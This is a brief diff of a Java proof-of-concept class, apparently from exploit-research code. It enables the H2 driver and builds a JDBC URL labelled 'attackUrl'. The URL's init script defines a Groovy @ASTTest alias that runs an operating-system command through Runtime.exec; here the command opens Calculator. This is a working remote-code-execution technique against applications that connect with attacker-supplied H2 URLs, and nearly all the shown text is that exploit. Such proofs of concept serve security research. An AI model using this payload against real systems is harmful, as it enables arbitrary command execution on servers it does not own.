@@ -17,7 +17,7 @@ import java.sql.DriverManager;
  */
 public class Groovy {
     public static void main(String[] args) throws Exception {
-//        Class.forName("org.h2.Driver");
+        Class.forName("org.h2.Driver");
 
         String attackUrl = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;init=CREATE ALIAS T5 AS '@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")})def x'";
         Connection connection = DriverManager.getConnection(attackUrl);
